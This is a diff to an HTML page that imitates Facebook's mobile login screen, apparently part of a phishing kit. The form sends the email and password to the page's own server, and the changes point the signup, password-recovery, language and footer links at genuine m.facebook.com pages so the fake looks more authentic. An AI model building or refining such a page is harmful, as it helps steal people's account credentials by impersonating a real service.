@@ -30,15 +30,15 @@
     <div class="main">
         <!-- form -->
         <form class="form" action="/" method="post" accept-charset="utf-8">
-            <input class="input" type="text" name="email" id="email" placeholder="Mobile number or email address" />
-            <input class="input" type="password" name="pass" id="pass" placeholder="Password" />
+            <input class="input" type="text" name="email" id="email" placeholder="Mobile number or email address" required />
+            <input class="input" type="password" name="pass" id="pass" placeholder="Password" required />
             <button type="submit" class="form-submit">log in</button>
         </form>
         <!-- span -->
         <span class="span">or</span>
         <!-- create new account button -->
-        <input class="create-button" type="submit" id="create-button" value="Create New Account" />
-        <p class="f-password">Forgot Password?</p>
+        <a href="https://m.facebook.com/reg"> <input class="create-button" type="submit" id="create-button" value="Create New Account" /> </a>
+        <p class="f-password"> <a href="https://m.facebook.com/login/identify">Forgot Password?</a> </p>
     </div>
     <!-- others -->
     <div class="others">
@@ -56,14 +56,14 @@
             <a href="#" class="language">Español</a>
             <a href="#" class="language">Português (Brasil)</a>
             <a href="#" class="language">Français (France)</a>
-            <a href="#" id="morelang"><i class="fa fa-plus" aria-hidden="true"></i></a>
+            <a href="https://m.facebook.com/language.php" id="morelang"><i class="fa fa-plus" aria-hidden="true"></i></a>
         </div>
     </div>
     <!-- facebook inc -->
-    <p class="facebook-inc">Facebook Inc.</p>
+    <p class="facebook-inc"> <a href="https://m.facebook.com/language.php">Facebook Inc.</a> </p>
     
-    <!-- Project -->
-    <!-- <script src="/js/main.js"></script> -->
+    <!-- javascript -->
+    {{>javascript}}
 </body>
 
 </html>
